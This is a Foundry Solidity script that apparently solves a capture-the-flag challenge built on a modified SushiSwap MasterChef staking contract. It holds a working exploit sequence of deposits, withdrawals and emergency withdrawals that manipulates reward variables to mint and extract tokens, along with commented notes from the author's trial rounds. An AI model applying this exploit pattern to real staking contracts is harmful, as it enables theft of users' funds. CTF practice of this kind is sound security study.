// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {IERC20} from "@openzeppelin-contracts-4.8.0/contracts/token/ERC20/IERC20.sol";


// https://github.com/sushiswap/masterchef/blob/master/contracts/MasterChef.sol
// https://dev.to/heymarkkop/understanding-sushiswaps-masterchef-staking-rewards-1m6f
interface  Chef {
    function poolLength() external returns (uint256);
    function add(uint256 allocPoint, address lpToken, bool withUpdate) external;
    function set(uint256 pid, uint256 allocPoint, bool withUpdate) external;
    function setMigrator(address migrator) external;
    function migrate(uint256 pid) external;
    function getMultiplier(uint256 from, uint256 to) external returns (uint256);
    function pendingSushi(uint256 pid, address user) external returns (uint256);
    function massUpdatePools() external;
    function updatePool(uint256 pid) external;
    function deposit(uint256 pid, uint256 amount) external;
    function withdraw(uint256 pid, uint256 amount) external;
    function emergencyWithdraw(uint256 pid) external;
    function dev(address devaddr) external;
    function sushi() external returns (address);
    function devaddr() external returns (address);
    function bonusEndBlock() external returns (uint256);
    function sushiPerBlock() external returns (uint256);
    function BONUS_MULTIPLIER() external returns (uint256);
    function migrator() external returns (address);
    function poolInfo(uint256 pid) external returns (address,uint256,uint256,uint256);
    function userInfo(uint256 pid, address user) external returns (uint256,uint256);
    function totalAllocPoint() external returns (uint256);
    function startBlock() external returns (uint256);
    function player() external returns (address);
    function isSolved() external returns (bool);
}


contract ChefSolve is Script {
    Chef public chef = Chef(0x28b165493bEcd97F2e527d4Fe6cD013DAD632B38); 
    IERC20 public sushi = IERC20(chef.sushi());
    address player = vm.envAddress("PLAYER");

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // console.log("chef : ", address(chef));
        // console.log("sushi : ", address(sushi));
        // console.log("Dev Addr : ", chef.devaddr());
        // console.log("sushi per block: ", chef.sushiPerBlock());
        // console.log("startBlock : ", chef.startBlock());
        // console.log("bonusEndBlock : ", chef.bonusEndBlock());
        // console.log("player : ", player);
        // console.log("sushi totalSupply() : ", sushi.totalSupply());
        // console.log(" poolLength : ", chef.poolLength()); //PID
        // console.log(" totalAllocPoint : ", chef.totalAllocPoint()); //PID
        

        (address poolLPToken, uint256 allocPoint, uint256 lasteRewardBlock, uint256 accSushiPerShare) = chef.poolInfo(0);
        // console.log(" poolLp : ", poolLPToken);
        // console.log("allocPoint : ", allocPoint);
        // console.log("lastRewardBlock: ", lasteRewardBlock);
        // console.log("accSushiPerShare : ", accSushiPerShare);
        console.log("player sushi balance : ", sushi.balanceOf(player));
        // console.log("chef sushi balance : ", sushi.balanceOf(address(chef)));
        // console.log("dev sushi balance : ", sushi.balanceOf(chef.devaddr()));
        // console.log("player actual LP token balance : ", IERC20(poolLPToken).balanceOf(player)); // 1 ether
        // console.log("chef actual LP token balance : ", IERC20(poolLPToken).balanceOf(address(chef)));
        (uint256 amount, uint256 rewardDebt) = chef.userInfo(0, player);
        console.log("user.amount : ", amount);
        console.log("user.rewardDebt : ", rewardDebt);
        // console.log("========================");
        
        // R1 Intital run
        // IERC20(poolLPToken).transfer(address(chef), 1 wei); // r1
        //  // bypass `if (lpSupply == 0)` in updatePool // lpSupply = 1
        // IERC20(poolLPToken).approve(address(chef), type(uint256).max); // r1
        // chef.deposit(0, 0.9 ether);  // r1
        // chef.deposit(0, 3);  // r1
        // chef.withdraw(0, 0.9 ether);  // r1
        // chef.emergencyWithdraw(0); // r1
        // console.log("sushi per block: ", chef.sushiPerBlock()); //r1
        
        // Not enough sushi per block modify slot again.. This time modify bonusEndBlock also.. 
        // R2 after some time

        // chef.deposit(0, 0.9 ether);  // r2
        // chef.deposit(0, 3);  // r2 // Modily slot 3 (sushiPerblock)
        // chef.withdraw(0, 0.9 ether);  // r2
        // chef.emergencyWithdraw(0); // r2
        // console.log("sushi per block: ", chef.sushiPerBlock()); //r2

        // chef.deposit(0, 0.9 ether);  // r2
        // chef.deposit(0, 5);  // r2 // Modily slot 5 (bonusEndBlock) 
        // chef.withdraw(0, 0.9 ether);  // r2
        // chef.emergencyWithdraw(0); // r2
        // console.log("bonusEndBlock : ", chef.bonusEndBlock()); //r2

        // Wait for sometime to pass few blocks and mint more sushi
        // R3 after just few blocks
        chef.deposit(0, 0.9 ether);  // r3
        chef.deposit(0, 1);  // r3




        // ( poolLPToken,  allocPoint,  lasteRewardBlock,  accSushiPerShare) = chef.poolInfo(0);
        // console.log("poolLp : ", poolLPToken);
        // console.log("allocPoint : ", allocPoint);
        // console.log("lastRewardBlock: ", lasteRewardBlock);
        // console.log("accSushiPerShare : ", accSushiPerShare);
        console.log("player sushi balance : ", sushi.balanceOf(player));
        // console.log("chef sushi balance : ", sushi.balanceOf(address(chef)));
        // console.log("dev sushi balance : ", sushi.balanceOf(chef.devaddr()));
        // console.log("player actual LP token balance : ", IERC20(poolLPToken).balanceOf(player)); 
        // console.log("chef actual LP token balance : ", IERC20(poolLPToken).balanceOf(address(chef)));
        ( amount,  rewardDebt) = chef.userInfo(0, player);
        console.log("user.amount : ", amount);
        console.log("user.rewardDebt : ", rewardDebt);
        console.log("isSolved() : ", chef.isSolved());

        // revert();
    }
}




        // Instance One
                // IERC20(poolLPToken).transfer(address(chef), 1 wei); // r1
                // IERC20(poolLPToken).approve(address(chef), 1 ether - 1 wei); // r2
                // chef.deposit(0, 1 ether - 2 wei); // r2
                // chef.deposit(0, 1 wei); // r3
                // chef.emergencyWithdraw(0); // r4
                // chef.deposit(0, 1 wei); // r5
                // chef.deposit(0, 1 wei); // r6
                // chef.deposit(0, 0.99 ether); // r7
                // chef.deposit(0, 1 wei); // r8
                // chef.deposit(0, 1 wei); // r9
                // chef.withdraw(0, 1 wei); // r10
                // chef.emergencyWithdraw(0); // r11
                // chef.deposit(0, 1 wei); // r12
                // Lol, nothing working wait for more blocks before deposit again
                // chef.deposit(0, 1 wei); // r13
                // chef.emergencyWithdraw(0); // r14
                
                // Not working.. Try to get into else block of getMultiPlier
                // chef.deposit(0, 0.9 ether); // r15
                // chef.withdraw(0, 0.9 ether - 0.00001 ether); // r15
                // chef.emergencyWithdraw(0); // r15
                // wait for sometime
                // chef.deposit(0, 0.9 ether); // r15
                // chef.withdraw(0, 0.00001 ether); // r15

                // resetting again and cleaning console.logs
                // chef.emergencyWithdraw(0); // r16
                // chef.deposit(0, 0.9 ether); // r17
                // chef.withdraw(0, 0.9 ether - 0.00001 ether); // r17
                // chef.emergencyWithdraw(0); // r17
                // Wait for sometime
                // chef.deposit(0, 0.9 ether); // r18
                // chef.withdraw(0, 0.00001 ether); // r18
        
        // Instance 2 0x2D213A10135A87f9D3C0f86f32C27fa48Cea74F4
                // IERC20(poolLPToken).transfer(address(chef), 1 wei); // r1  
                    // bypass `if (lpSupply == 0) {` in updatePool // lpSupply = 1
                // IERC20(poolLPToken).approve(address(chef), type(uint256).max); // r1
                // Try to get into `else if block` of getMultiPlier
                // chef.deposit(0, 0.9 ether); // r1   
                        // sushiReward = (block.timestamp - startBlock) 
                                // sushi.mint(devaddr, sushiReward.div(10));
                                // sushi.mint(address(this), sushiReward);
                        // pool.accSushiPerShare = 0 + (sushiReward*1e12)/1
                        // user.amount = user.amount.add(_amount);
                        // user.rewardDebt = user.amount.mul(pool.accSushiPerShare).div(1e12);
                // In the same block to escape from _updatePool
                // chef.deposit(0, 1); // r1  
                // chef.emergencyWithdraw(0); // r1

                // wait for sometime
                // chef.deposit(0, 1); // r
                // chef.deposit(0, 0.9 ether); // r

                // WAIT?? shushi is transfeering its all money but it the sushi supply was not high... How to make sushi.mint to chef?
                    // To mint more sushi only way to increase `sushiReward = getMultiplier(pool.lastRewardBlock, block.number);`
        
